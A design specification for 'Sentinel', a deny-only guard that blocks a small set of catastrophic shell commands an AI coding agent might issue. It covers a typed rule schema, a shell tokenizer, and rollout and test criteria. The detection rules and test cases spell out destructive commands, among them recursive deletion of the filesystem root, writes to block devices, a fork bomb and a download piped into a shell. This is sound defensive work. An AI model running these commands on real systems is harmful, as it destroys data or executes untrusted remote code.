# T389 P3W2 — Structured Sentinel rules

## 1. Status

**Specified (not implemented)** · 2026-10-02 · Epic T389 · Wave P3W2 · No fact family ·
Feature `gate.sentinel` (reserved in contract §18; its wire shape is decided here).
Master: [`00-master.md`](00-master.md) · Contract: [`01-contract.md`](01-contract.md) ·
ADR: [ADR-0018](../../adr/0018-harnu-mod-as-integration-substrate.md) (D5, D13) ·
Legacy: `src/main/sentinel-core.ts`, `src/main/sentinel-resolver.ts` (T31).
Verified against CLI 2.1.287 and repo `main` @ `46d70c7d` (line references re-checked after the Harnu rename; the earlier base `b35a2c06` is not in this repository).

## 2. Depends on / Unblocks

- **Depends on:** P3W1 and P2W1 (`sentinel.set`). Base branch: P3W1 (which stacks on P2W3, itself
  above P2W1). Through them: P1W4, P1W5.
- **Interfaces used** (master §12, the owner's signatures):
  - P1W1: `companionHost.registerAskKind('sentinel', fn)` (the broker of P3W1 handles
    `permission` only), `beforeHello(fn)` (every hello response carries `sentinel.set`),
    `markProven(b, 'gate.sentinel')`.
  - P2W1: `enqueue(req)`, `registerGateRow('sentinel.set', row)`; mod side
    `registerCommandHandler('sentinel.set', fn)`.
  - P3W1: the mod's `ask($, req)` client; the `HookRequest` its broker builds; the stand-down,
    which is P2W3's `shouldStandDown` predicate as extended by P3W1.
  - P1W5: the shared `tool.check` registration (contract §11.4, step 2 is this wave's).
  - P1W4: `registerPrefsKey('sentinel', …)`, `prefsKey('sentinel')`, `recordFact('sentinel', …)`.
- **Unblocks:** nothing.
- **Constrains:** P5W1: the regex engine is on ARB-8's never-delete list. P5W1 may demote it from
  the legacy transport, on this wave's ledger evidence; it never deletes it.

## 3. Summary

The Sentinel auto-denies a small set of catastrophic commands before a human is asked. Today it
is nine regular expressions over one string (`sentinel-core.ts:23-67`), applied only when the
tool name looks like a shell and the input has a `command`, `cmd` or `script` string
(`:70-80`). It runs as a resolver on the hook bridge (`sentinel-resolver.ts:31-61`), so it sees a
call only where Harnu's global `PreToolUse` hook is installed.

A regex over a string is wrong in both directions: `echo "rm -rf /"` and a commit message that
quotes a command are denied; `rm -r -f --no-preserve-root /` behind `sudo env X=1` depends on how
far the pattern's author thought. This wave adds a second engine that evaluates **typed rules**
against the tool call the engine itself reports: the tool name, its typed input, the cwd, the
permission mode. Evaluation always runs in the host. The mod never decides: it carries the
question and returns the host's deny.

## 4. Evidence

| Smoke / source          | Verdict   | What this wave takes from it                                                                                                                  |
| ----------------------- | --------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| B1.6                    | CONFIRMED | `tool.check` fires in every permission mode, with `tool`, `input` and `tool_use_id`; a hook may answer `deny` even under `bypassPermissions`. |
| B1.2                    | CONFIRMED | A deny from `tool.check` reaches the model as `Permission to use <Tool> denied by plugin <name>: <reason>`.                                   |
| B1.7, B1.8              | CONFIRMED | A deny from `classic.PermissionRequest` or `classic.PreToolUse` reaches the model **bare**.                                                   |
| B1.5, B6                | CONFIRMED | A failing hook returns the engine's verdict; a sibling's wedge skips the chain for that call.                                                 |
| B4                      | CONFIRMED | `tool.check` on Bash does not break worktree-isolated agents; only `tool.call` does.                                                          |
| B1.2 / types L4776-4792 | API fact  | The hook budget stops during a `$` call, except a `$.clock` wait.                                                                             |
| types L12072-12089      | API fact  | `ToolCheckInput { tool, input, tool_use_id? }`; the id is absent on another plugin's dry run. No `agentId`.                                   |
| Study, "new 6"          | PARTIAL   | "No Sentinel rule was exercised" in the smoke runs: every rule behaviour below is an AC.                                                      |
| D6                      | REFUTED   | A same-tier mod can forge the host's answer; the Sentinel stays a net, not a wall.                                                            |

## 5. Deviations from the study

| #   | Study said                                                | This spec                                                                                          | Decision    | Evidence         |
| --- | --------------------------------------------------------- | -------------------------------------------------------------------------------------------------- | ----------- | ---------------- |
| 1   | New 6: rules evaluated in `tool.check` on typed arguments | Evaluated in the **host**; the mod reports the call and returns a deny. No rule logic in the mod   | D13, SEC-9c | security paper   |
| 2   | New 6: `tool.check` is where the Sentinel acts            | Two delivery points: the ask (P3W1's hold) and a `tool.check` query; the legacy hook keeps its own | D5          | smoke B1.6, B1.7 |
| 3   | Implied: structured rules replace the regex               | The regex engine stays authoritative on the legacy transport                                       | ARB-8       | master §4        |

## 6. Scope / Non-goals

**In scope.** The rule schema and evaluator; a shell lexer good enough for the nine built-in
rules; migration of those rules; the three evaluation points; the `sentinel` ask kind; deny
wording; the parity corpus and the flip gate.

**Non-goals.**

- No rule editor and no user-authored rules file. The schema is versioned so a later wave can add
  them; this wave ships the built-in set only.
- No allow rule, ever: `action` is the literal `'deny'` (SEC-9c). A grant is `plan_mission`'s job.
- No evaluation in the mod, no rule text on the wire.
- No `tool.call` hook (SEC-9d). No coverage for sessions without a companion beyond what the
  bridge gives today.
- No claim that a shell command is "parsed": the lexer is a conservative tokenizer, and anything
  it cannot tokenize falls back to the regex engine.

## 7. Design

### 7.1 Rule schema

New pure files: `src/main/sentinel-rules.ts` (the built-in set), `src/main/sentinel-structured-core.ts`
(evaluator), `src/main/shell-lex-core.ts` (tokenizer). No electron or node imports (ADR-0001).

```ts
interface SentinelRule {
  v: 1
  id: string // snake_case, stable; appears in the shadow log and the ledger
  action: 'deny'
  tools: string[] // exact tool names, e.g. ['Bash']
  when: Pred
  reason: string // the fragment today's SentinelVerdict.reason carries
}

type Pred =
  | { all: Pred[] }
  | { any: Pred[] }
  | { not: Pred }
  | { input: { path: string; op: 'eq' | 'in' | 'prefix' | 'regex'; value: string | string[] } }
  | { fsPath: { path: string; is: PathClass[] } } // a file tool's path field
  | { shell: ShellPred } // true when ANY simple command of the line matches

interface ShellPred {
  program: string[] // basename, after wrappers are peeled
  flags?: { all?: string[]; any?: string[]; none?: string[] } // normalized, see below
  args?: { any?: ArgPred[] }
  redirect?: { any?: ArgPred[] } // targets of > and >>
  pipedInto?: string[] // program of the next command in the same pipeline
}

type ArgPred = { eq: string } | { regex: string } | { is: PathClass } | { startsWithKey: string }
type PathClass = 'fs-root' | 'home' | 'block-device' | 'protected-branch'

interface SentinelContext {
  tool: string
  input: unknown
  cwd?: string
  permissionMode?: string
  agentId?: string
  source: 'ask' | 'check' | 'bridge'
}

interface StructuredVerdict {
  outcome: 'deny' | 'pass' | 'unparsed'
  ruleId?: string
  reason?: string
}
```

**Normalization** (what makes a rule typed rather than textual):

| Step          | Rule                                                                                                                                                   |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Split         | On unquoted `;`, `&&`, `\|\|`, `\|`, `&` and newline into simple commands; `\|` links two commands as a pipeline.                                      |
| Tokens        | Single quotes literal; double quotes with `\` escapes; backslash escapes outside quotes. No expansion of `$VAR`, globs or `~` (they stay as written).  |
| Leading noise | `VAR=value` assignments are dropped.                                                                                                                   |
| Wrappers      | `sudo`, `doas`, `env`, `command`, `exec`, `nohup`, `time`, `nice` and their own flags and assignments are peeled; the next token is the program.       |
| Nested shell  | `sh\|bash\|zsh -c "<string>"` is lexed again, at most `SENTINEL_NEST_MAX` deep. `$( … )` and backticks are lexed as commands of their own.             |
| Flags         | `-rf` → `r`, `f`; `--recursive` → `recursive`; rules name aliases explicitly (`r`, `R`, `recursive`). `--` ends the flags.                             |
| Redirects     | `> x`, `>> x`, `>x` become `redirect` targets and are not arguments.                                                                                   |
| Path classes  | `fs-root`: `/` or `/*`. `home`: `~`, `~/`, `$HOME`, `${HOME}`. `block-device`: `/dev/(sd\|nvme\|disk\|hd\|vd)…`. `protected-branch`: `main`, `master`. |
| Unparsed      | An unterminated quote, a here-document, or more than `SENTINEL_LEX_MAX_TOKENS` tokens → `outcome: 'unparsed'`.                                         |

`evaluate(rules, ctx)` is total and never throws: any internal error yields `unparsed`.

### 7.2 Migration of the nine patterns

Each `PATTERNS` entry (`sentinel-core.ts:23-67`) becomes one rule with the same `reason` text, so
the toast, the shadow log and the notification copy do not change.

| Rule id                   | Today (line) | Typed form                                                                                                                              |
| ------------------------- | ------------ | --------------------------------------------------------------------------------------------------------------------------------------- |
| `rm_root_or_home`         | `:26`        | program `rm`; flags all of {recursive, force} (any alias); an argument that `is` `fs-root` or `home`                                    |
| `dd_to_device`            | `:31`        | program `dd`; an argument `startsWithKey: "of="` whose value `is` `block-device`                                                        |
| `mkfs_device`             | `:35`        | program matching `mkfs` or `mkfs.<type>`; an argument under `/dev/`                                                                     |
| `wipefs`                  | `:39`        | program `wipefs`                                                                                                                        |
| `redirect_to_device`      | `:44`        | any command with a `redirect` target that `is` `block-device`                                                                           |
| `fork_bomb`               | `:49`        | `{ input: { path: 'command', op: 'regex', value: <today's expression> } }`: it has no argv shape, so it stays a string rule, on purpose |
| `chmod_777_root`          | `:54`        | program `chmod`; an argument matching `[0-7]*777[0-7]*`; an argument that `is` `fs-root`                                                |
| `force_push_protected`    | `:59`        | program `git`; first argument `push`; flags any of {f, force}; none of {force-with-lease}; an argument that `is` `protected-branch`     |
| `download_piped_to_shell` | `:64`        | program in {curl, wget}; `pipedInto` in {sh, bash, zsh}, with `sudo` peeled                                                             |

`tools` is `['Bash']` for all nine. The legacy `shellCommand()` name heuristic (`:70-80`) is kept
by the regex engine; the structured engine matches the exact tool name the CLI reports.

### 7.3 Where evaluation runs

All three points are in the host and share one function:

```ts
/** sentinel-resolver.ts — the only caller of both engines. */
function sentinelDecide(ctx: SentinelContext): { deny: boolean; reason?: string; ruleId?: string }
```

| `sentinel` key  | E2: transport `bridge` (legacy `PreToolUse` / `PermissionRequest` POST) | E1: a permission ask P3W1's broker runs through the chain      | E3: the `tool.check` query                                                                     |
| --------------- | ----------------------------------------------------------------------- | -------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| `regex` (ships) | regex decides                                                           | regex decides                                                  | not sent: `gate.sentinel` is not enabled                                                       |
| `shadow`        | regex decides; structured verdict recorded                              | regex decides; structured verdict recorded                     | sent; both verdicts recorded; answered `released` (reason `shadow`), so nothing is denied here |
| `structured`    | regex decides; structured verdict recorded                              | structured decides; `unparsed` falls back to the regex verdict | structured decides; `unparsed` falls back to the regex verdict                                 |

E1 exists only while the `approval` family is `active` and owned for the session: otherwise the
broker releases the ask before the resolver chain runs and the Sentinel does not see it. The
shadow corpus therefore comes from E2 and E3.

The T30 ramp still applies in every cell: `rampActionFor(cwd)` decides whether the Sentinel acts
(`park`), previews (`preview`) or ignores, exactly as `sentinel-resolver.ts:35-52` does.

**E1 — the ask payload.** P3W1's broker runs the resolver chain on every permission ask. The
Sentinel resolver (priority 20) calls `sentinelDecide({ source: 'ask', … })` with the typed
`payload.input`. A deny decides the ticket at once: the mod's `classic.PermissionRequest` hook
returns `{ decision: { behavior: 'deny', message } }`, the dialog closes, no Inbox row appears.

**E2 — the legacy hook (unchanged transport).** While a session is owned, the bridge stands down
for a human park but still runs synchronous resolvers (ARB-9a), so a `PreToolUse` POST carrying
`tool_name` and `tool_input` is still evaluated and denied on the bridge. This is the only point
that sees a call the engine would **allow** when no companion is loaded.

**E3 — the `tool.check` query.** For a call of a watched tool the mod asks the host before the
verdict stands:

```ts
// step 2 of the shared tool.check body (contract §11.4), after `const r = await next(e)`
if (enabled('gate.sentinel') && e.tool_use_id && watched.has(e.tool)) {
  const v = await raceBudget(
    ask($, {
      askId: 'ask_s' + e.tool_use_id,
      kind: 'sentinel',
      d: { tool: e.tool, input: e.input, toolUseId: e.tool_use_id, verdict: r.decision, cwd }
    }),
    SENTINEL_CHECK_BUDGET_MS
  )
  if (v?.state === 'decided' && v.decision.behavior === 'deny')
    return { decision: 'deny', reason: v.decision.message }
}
// then step 3 (the fleet.checks record when r.decision === 'ask') and `return r`
```

- `raceBudget` races the fetch against a `$.clock` timer. A timeout, a failure, `released` or a
  malformed body (`ask` answers `null` on a transport failure) all leave `r` untouched (SEC-1)
  and report one `mod.error { where: 'gate.sentinel', kind: 'timeout' }` per minute at most.
- The host answers a `sentinel` ask at once; it is never parked and never creates a ticket row.
- `watched` is the set of tool names the active rules name, at most `SENTINEL_TOOLS_MAX`. It
  reaches the mod through `sentinel.set`, enqueued from `beforeHello` in every hello response
  and again when it changes. Tool names only.
- E3 covers what E1 cannot: a call the engine allows by mode or rule, in a session where no
  legacy hook sees it. This is what preserves the Sentinel deny under operator decision point
  **OD-2** (master §13), where an owned session in `acceptEdits` or `bypassPermissions` is no
  longer held on every call. E3 exists only with the `sentinel` key at `structured` (or at
  `shadow`, for recording). It also denies an `ask` call before the dialog is drawn.
- E3 is not available headless (MOD-5), nor when a policy pins `tool.check` against the user tier
  (none is known to: `sec-default` passes it, master Q8).

One call may be evaluated at E2, then E3, then E1. The verdict is deterministic, so the first
deny wins and the others never run. `sentinelDecide` dedupes its side effects (shadow entry,
`sentinel:blocked` toast, audit) on `toolUseId`.

### 7.4 Deny wording

The reason must read correctly in both renderings (MOD-8):

- from `tool.check`: `Permission to use Bash denied by plugin harnu-companion: <message>`
- from `classic.PermissionRequest` and the legacy hook: `<message>` alone.

`message` = `Harnu Sentinel blocked this call: <reason>. It was not run. Do not retry it or work
around it; tell the user what you were trying to do.`

`<reason>` is the rule's `reason` (for example "recursive delete of the filesystem root or home
directory"). The legacy transport keeps today's text (`Harnu Sentinel blocked <reason>`,
`sentinel-resolver.ts:59`) until its engine is flipped, so existing tests and transcripts stay
valid.

### 7.5 Contract additions

None — merged into `01-contract.md`: §10 and §10.2 (the `sentinel` ask kind, its payload, the
deny-only decision), §9 (`sentinel.set { tools }`, an observe-only command), §7.2
(`SENTINEL_CHECK_BUDGET_MS`, and `SENTINEL_TOOLS_MAX` = 32, the cap of one `sentinel.set`), §11.1
and §11.2 (the hooks and the proof of `gate.sentinel`), §11.4 (the step order inside
`tool.check`: this wave's query is step 2), §10.1 (`tool.check` returns the verdict unchanged
"except a host Sentinel deny") and §11.5 (the `sentinel` key).

Kept here because they are **host-only**, not contract constants: `SENTINEL_NEST_MAX` = 2 (nested
`-c` depth) and `SENTINEL_LEX_MAX_TOKENS` = 2 048 (tokenizer cap). The ask id of a query is
`ask_s<tool_use_id>`.

`watched` lives in the mod's module memory, not in `$.state`: every hello response carries
`sentinel.set` again (contract §22), so a hot reload restores it.

Only the `sentinel` key's own `shadow` makes the host answer a `sentinel` ask `released` with
reason `shadow` (after recording both engines' verdicts). The `approval` family's `shadow`
affects E1 only, and differently: P3W1's broker releases a permission ask before the resolver
chain runs, so E1 is **not evaluated** there at all.

## 8. Arbitration & fallback

There is one rule: the Sentinel only ever adds a deny, so two sources never conflict and nothing
is arbitrated. The union of denies is the result.

| Condition                                                                                                     | E1 (permission ask)                                                                                                  | E2 (legacy hook)                                           | E3 (`tool.check` query)                                                                                               |
| ------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| Mod absent, CLI too old, companion mode `off`                                                                 | —                                                                                                                    | regex, as today                                            | —                                                                                                                     |
| `sentinel` key `regex` (ships)                                                                                | regex decides                                                                                                        | regex, as today                                            | no query is sent                                                                                                      |
| `sentinel` key `shadow`                                                                                       | regex decides; structured verdict recorded                                                                           | regex decides; structured verdict recorded                 | both verdicts recorded; answered `released` (reason `shadow`)                                                         |
| `sentinel` key `structured`, `approval` owned                                                                 | structured decides                                                                                                   | regex decides (stand-down keeps the synchronous resolvers) | structured decides                                                                                                    |
| `approval` family in `shadow`, or not owned                                                                   | **not evaluated**: the broker releases before the chain (contract §10.1)                                             | regex, as today                                            | as the `sentinel` key says: the query does not depend on the `approval` family                                        |
| Kill switch turned off mid-session                                                                            | —                                                                                                                    | regex, at once                                             | `conn` revoked, re-hello answered `enable: []`: no query                                                              |
| CLI above the tested ceiling                                                                                  | not evaluated (`approval` forced to `shadow`)                                                                        | regex                                                      | the key is capped at `shadow`: recorded, `released`                                                                   |
| Global hook install off (`hooks:setEnabled false`)                                                            | per the key                                                                                                          | —                                                          | structured: the only cover for a call the engine allows                                                               |
| `sec-default` (`classic.*` pinned; `tool.check` passes, with settings deny rules held over a user-tier allow) | — (`classic.*` pinned: no ask)                                                                                       | regex                                                      | queried as usual: the deny is a deny, which `sec-default` leaves standing (its README; master Q8 confirms on 2.1.287) |
| Lease lost                                                                                                    | —                                                                                                                    | regex                                                      | fetch fails → `r` unchanged                                                                                           |
| Host down, slow (> 500 ms) or restarting                                                                      | native dialog                                                                                                        | hook POST fails → engine verdict                           | `r` unchanged                                                                                                         |
| Headless `-p`                                                                                                 | —                                                                                                                    | regex                                                      | —                                                                                                                     |
| Input over the cap                                                                                            | evaluated on the truncated input with `inputTruncated` set (P3W1's `permission` payload); `unparsed` → regex verdict | regex on the full body                                     | the `sentinel` ask is answered `released`, logged `truncated`                                                         |
| Command the lexer cannot tokenize                                                                             | regex verdict                                                                                                        | regex                                                      | regex verdict                                                                                                         |
| A sibling mod wedges the worker                                                                               | chain skipped for that call                                                                                          | regex still sees `PreToolUse`                              | chain skipped                                                                                                         |
| Interceptor `off`, or folder off the ramp                                                                     | ignore / preview only                                                                                                | ignore / preview only                                      | ignore / preview only                                                                                                 |
| Another plugin's `$.tool.check` dry run                                                                       | —                                                                                                                    | —                                                          | not queried (no `tool_use_id`)                                                                                        |

No path produces an allow: a `sentinel` decision type has no allow, and every failure returns
what the engine already said.

## 9. Security requirements

SEC-1, SEC-3c/d, SEC-5a, SEC-6, SEC-7 and SEC-9c/d apply as written. Wave-specific:

- **S1. Deny-only by type.** `SentinelRule.action` and `AskDecisions.sentinel.behavior` are the
  single literal `'deny'`. The mod's `tool.check` hook has no site that returns
  `decision: 'allow'` (static test).
- **S2. Host-side rules.** No rule, pattern or path class is staged with the mod or sent on the
  wire; `sentinel.set` carries tool names only.
- **S3. Untrusted input.** `evaluate` treats `ctx.input` as hostile: bounded tokenizer, bounded
  nesting, and every `regex` operand in the built-in set is checked by a test for linear-time
  behaviour on a 64 KiB adversarial line.
- **S4. No rule content in logs beyond the rule id and reason.** The shadow entry and the ledger
  carry the tool, the rule id and a hash of the input, not the command.
- **S5. Honest scope.** Docs and copy say what the Sentinel recognises (nine shapes) and that a
  command written to evade it will pass. Never "blocks dangerous commands" without "a small set
  of".

## 10. UX & copy

No new surface and no new string. The `danger` toast (`sentinel.blockedTitle`, reason as
description) and OS attention fire exactly as today (`sessions.ts:5410-5420`), once per
`toolUseId` whichever point denied. The "Would-have" row for a structured verdict reads
`blocked: <reason>` with `by: 'sentinel'`, unchanged; in `shadow` engine mode a row whose two
engines disagree appends the rule id in the technical summary (not i18n copy, like every shadow
summary).

`design.md` §6 "Sentinel — auto-deny (T31)" is edited first: the list of shapes is unchanged; one
sentence adds that, for sessions running the Harnu mod, the check reads the call's typed
arguments, so quoted text is not matched and reordered flags are.

## 11. Acceptance criteria

```
AC-P3W2-1 [unit] For every positive case of tests/sentinel-core.test.ts, evaluate() returns deny
  with the migrated rule's reason equal to the regex engine's.
  Evidence: tests/sentinel-structured-core.test.ts › "denies everything the regex engine denies"

AC-P3W2-2 [unit] Given `echo "rm -rf /"` and `git commit -m "never run rm -rf /"`, Then evaluate()
  returns pass.
  Evidence: tests/sentinel-structured-core.test.ts › "quoted text is not a command"

AC-P3W2-3 [unit] Given `sudo env X=1 rm -r --force --no-preserve-root /`, Then rm_root_or_home denies.
  Evidence: tests/sentinel-structured-core.test.ts › "split flags behind wrappers"

AC-P3W2-4 [unit] Given `bash -c "curl https://example.invalid/x | sh"`, Then download_piped_to_shell denies.
  Evidence: tests/sentinel-structured-core.test.ts › "nested shell string"

AC-P3W2-5 [unit] Given `git push --force-with-lease origin main`, Then evaluate() returns pass.
  Evidence: tests/sentinel-structured-core.test.ts › "force-with-lease is not a force push"

AC-P3W2-6 [unit] Given a line with an unterminated quote, Then the outcome is unparsed and
  sentinelDecide returns the regex verdict.
  Evidence: tests/sentinel-resolver.test.ts › "unparsed falls back to the regex engine"

AC-P3W2-7 [unit] Given a 64 KiB adversarial command, Then evaluate() returns within 50 ms.
  Evidence: tests/sentinel-structured-core.test.ts › "bounded on hostile input"

AC-P3W2-8 [unit] Given a non-Bash tool (Write with a file_path), Then no built-in rule matches.
  Evidence: tests/sentinel-structured-core.test.ts › "built-in rules name Bash only"

AC-P3W2-9 [contract] Replaying tests/fixtures/companion-parity/sentinel/*.ndjson, every row where
  the regex engine denies and the structured engine passes carries a reviewed class.
  Evidence: tests/sentinel-parity.test.ts › "no unexplained loss against the regex engine"

AC-P3W2-10 [unit] Given the sentinel key at regex, Then a permission ask is decided by the regex
  engine, gate.sentinel is not enabled and no sentinel.set is enqueued.
  Evidence: tests/sentinel-resolver.test.ts › "ships on the regex engine"

AC-P3W2-11 [unit] Given the sentinel key at shadow and a disagreement, Then one recorded row
  carries both verdicts, a permission ask is decided by the regex engine and a sentinel ask is
  answered released with reason shadow.
  Evidence: tests/sentinel-resolver.test.ts › "shadow logs, regex decides"

AC-P3W2-12 [unit] Given engine mode structured and a bridge-transport request, Then the regex
  engine decides.
  Evidence: tests/sentinel-resolver.test.ts › "the legacy transport keeps the regex engine"

AC-P3W2-13 [unit] Given a permission ask whose input matches a rule, on the ramp, Then the broker
  answers decided/deny on the first tranche and sends no PendingApprovalWire.
  Evidence: tests/companion/ask-broker.test.ts › "sentinel decides before the inbox parks"

AC-P3W2-14 [unit] Given the folder is off the ramp, Then the same ask is not denied and a
  would-deny shadow entry is written.
  Evidence: tests/sentinel-resolver.test.ts › "respects the ramp on the companion transport"

AC-P3W2-15 [mod-test] Given gate.sentinel enabled and Bash watched, When tool.check runs for a real
  call and the host answers decided/deny, Then the hook returns {decision: "deny", reason: message}.
  Evidence: resources/companion/tests/sentinel.test.ts › "returns the host's deny"

AC-P3W2-16 [mod-test] Given the host answers released, a Failure, a malformed body, or nothing
  within SENTINEL_CHECK_BUDGET_MS, Then the hook returns next(e)'s verdict unchanged in each case.
  Evidence: resources/companion/tests/sentinel.test.ts › "every failure keeps the engine verdict"

AC-P3W2-17 [mod-test] Given a tool.check event with no tool_use_id, or a tool not in the watched
  set, Then no ask is sent.
  Evidence: resources/companion/tests/sentinel.test.ts › "queries real calls of watched tools only"

AC-P3W2-18 [unit] The companion source has no tool.check return of decision "allow" and no rule
  or pattern literal.
  Evidence: tests/companion/api-surface.test.ts › "the mod never decides a sentinel verdict"

AC-P3W2-19 [mod-test] Given isInteractive false, Then no sentinel ask is sent.
  Evidence: resources/companion/tests/sentinel.test.ts › "no query headless"

AC-P3W2-20 [unit] Given one call denied at E3 and evaluated again at E1, Then one shadow entry and
  one sentinel:blocked message exist for its toolUseId.
  Evidence: tests/sentinel-resolver.test.ts › "one block per call"

AC-P3W2-21 [integration] Given a real session in bypassPermissions with the companion, a fake host
  that denies rm_root_or_home, and no global hook, When the model runs the command, Then the tool
  result is "Permission to use Bash denied by plugin harnu-companion: Harnu Sentinel blocked this
  call: …" and nothing ran.
  Evidence: tests/cli/sentinel.cli.test.ts › "denies an allowed-by-mode call through tool.check"

AC-P3W2-22 [integration] Given the fake host never answers the sentinel ask, Then a benign Bash
  call completes and its added latency is under 1 s.
  Evidence: tests/cli/sentinel.cli.test.ts › "a silent host does not stall tool calls"

AC-P3W2-23 [integration] Given an Agent(isolation: "worktree") subagent running Bash with
  gate.sentinel enabled, Then its command runs inside the worktree.
  Evidence: tests/cli/sentinel.cli.test.ts › "worktree isolation survives the query"
  Guards: #92533

AC-P3W2-24 [live-verify] In default mode a matching command is denied before the dialog is drawn,
  the model's reply quotes the message, and the danger toast appears once.
  Evidence: LV-P3W2-a

AC-P3W2-26 [unit] Given the approval family in shadow and the sentinel key at structured, When a
  permission ask arrives, Then sentinelDecide is not called for it.
  Evidence: tests/companion/ask-broker.test.ts › "shadow releases before the sentinel runs"

AC-P3W2-27 [unit] Given the kill switch is turned off, Then the next hello response carries no
  sentinel.set and the legacy hook still denies a catastrophic command with the regex engine.
  Evidence: tests/sentinel-resolver.test.ts › "kill switch leaves the regex net in place"

AC-P3W2-28 [unit] Given a sentinel.set with more than SENTINEL_TOOLS_MAX names, Then the mod
  answers CMD_PRECONDITION and keeps its previous set.
  Evidence: resources/companion/tests/sentinel.test.ts › "refuses an oversized watch list"

AC-P3W2-29 [contract] A sentinel decision is never an allow (conformance row 28).
  Evidence: tests/companion/contract.test.ts › "sentinel decisions are deny-only"
```

**Human**

```
AC-P3W2-25 [human] The deny sentence reads naturally in the transcript in both renderings (with
  and without the plugin prefix).
  Evidence: screenshots LV-P3W2-a-check.png, LV-P3W2-a-request.png
```

**LV-P3W2-a.**

1. Second isolated Harnu; Interceptor `active` and the folder on the ramp; `approval` `active`;
   the `sentinel` key at `structured`; global hooks off for this run.
2. In a scratch repo, ask the model to run `git push --force origin main` against a local bare
   remote.
3. Confirm: no dialog; the tool row shows the deny with the plugin prefix; one toast; one
   "Would-have" row `by: sentinel`.
4. Send `sentinel.set { tools: [] }` through P2W1's debug route (gesture `debug`), which turns
   E3 off; repeat. Confirm the dialog
   flashes closed and the deny arrives bare (E1).
5. Run `echo "rm -rf /"`: it runs.
6. Record `claude --version` and the measured latency of ten benign Bash calls with E3 on and off.

## 12. Docs deliverables

| Deliverable                     | Change                                                                                                                                                                   |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `CHANGELOG.md`                  | `Changed` (when the engine flips to `structured`): the Sentinel reads a command's actual arguments for sessions running the Harnu mod; quoted text is no longer blocked. |
| `docs/harnu-features.md`        | No change: the Sentinel is not something a session calls or offers (not agent-facing). No marker bump.                                                                   |
| `docs/user/approval-inbox.md`   | A short "Sentinel" subsection: the nine shapes, deny-only, where it applies, that it is a net and can be evaded.                                                         |
| `design.md` §6                  | "Sentinel — auto-deny (T31)": one sentence, as §10.                                                                                                                      |
| i18n                            | none.                                                                                                                                                                    |
| `01-contract.md`, `contract.ts` | Already merged (§7.5); this wave lands `contract.ts` and the fixtures to match (DOC-7).                                                                                  |

## 13. Rollout & parity gate

- **Family:** none, so no family's `shadow` governs it (contract §11.5). One key, registered
  with `registerPrefsKey('sentinel', { default: 'regex', observeCap: 'shadow', … })`:
  `'regex' | 'shadow' | 'structured'`, invalid reads as `regex`. `gate.sentinel` is enabled only
  when the key is not `regex`, the companion mode is not `off`, the lease is live,
  `sense.attention` is enabled (it owns the shared `tool.check` registration) and the profile is
  interactive. `sentinel.set` is an observe-only command, so it does not need `channel: active`, but P2W1's
  `enqueue` refuses every command while `channel` is `off` (P2W1 §7.4 step 3): with `channel` `off`
  no watched set reaches the mod, E3 never asks, and the `sentinel` key at `structured` does nothing
  on the companion transport.
- **Corpus.** `tests/fixtures/companion-parity/sentinel/`:
  1. every command in `tests/sentinel-core.test.ts` (positive and negative);
  2. an adversarial set written for this wave (wrappers, split flags, nesting, quoting);
  3. `recordFact('sentinel', …)` rows recorded in `shadow`:
     `{ tool, inputHash, regex, structured, ruleId?, source }` for every call evaluated at E2 or
     E3 (E1 is not evaluated while `approval` is in `shadow`). The bridge sees every
     `PreToolUse`, so this fills quickly. A
     disagreeing row also stores the command with paths relativised and string literals hashed
     (QA-9), so it can be replayed.
- **Flip gate to `structured` (companion transport only):**
  - zero rows where regex denies and structured passes without a reviewed class
    (`regex-false-positive` is the only class expected);
  - zero structured denies on the benign rows without a reviewed class (`intended-extra-catch`);
  - 2 000 evaluated Bash calls from at least 20 sessions in `shadow`;
  - `unparsed` under 1 % of rows, each sampled;
  - AC-P3W2-21, -22, -23 green and LV-P3W2-a attached.
- **Legacy transport.** The regex engine stays there and is on ARB-8's never-delete list. P5W1
  may demote it from the legacy transport on the same ledger; it never deletes it.
- **Demoted:** nothing.

## 14. Open questions

| #   | Question                                                                                                          | Default until settled                  | Owner            |
| --- | ----------------------------------------------------------------------------------------------------------------- | -------------------------------------- | ---------------- |
| OQ1 | Does a `Promise.race` against a `$.clock` timer leave the abandoned fetch harmless (no later hook failure)?       | assumed; AC-P3W2-22 measures it        | P3W2             |
| OQ2 | Is the E3 round trip (2 ms median, 14 ms p90 per smoke A4) acceptable on every Bash call, or should E3 be opt-in? | on when the engine is `structured`     | P3W2             |
| OQ3 | Should built-in rules for file tools ship (a Write to a key or shell profile)? The schema allows it.              | no: parity with the nine first         | later            |
| OQ4 | User-authored rules and an editor.                                                                                | out of scope                           | later            |
| OQ5 | Master Q27: in `auto` mode the classifier settles an `ask`; does a `tool.check` deny still win?                   | assumed (B1.6: last word up the chain) | P3W1 (LV-P3W1-b) |

## 15. Risks

| Risk                                                    | Sev    | Mitigation                                                                     |
| ------------------------------------------------------- | ------ | ------------------------------------------------------------------------------ |
| The structured engine misses something the regex caught | High   | AC-P3W2-1, -9; `unparsed` → regex; regex stays on the legacy hook              |
| A new false positive blocks legitimate work             | Medium | shadow corpus with a benign gate; deny message tells the model to ask the user |
| E3 adds latency or a stall to every Bash call           | Medium | `SENTINEL_CHECK_BUDGET_MS`; AC-P3W2-22; OQ2                                    |
| The Sentinel is read as protection                      | Medium | S5 copy; SEC-7                                                                 |
| A sibling mod forges "no deny"                          | Medium | conceded (D6); E2 on the legacy hook is outside the mod chain                  |
| Lexer complexity grows into a shell parser              | Low    | closed normalization table; anything else is `unparsed`                        |
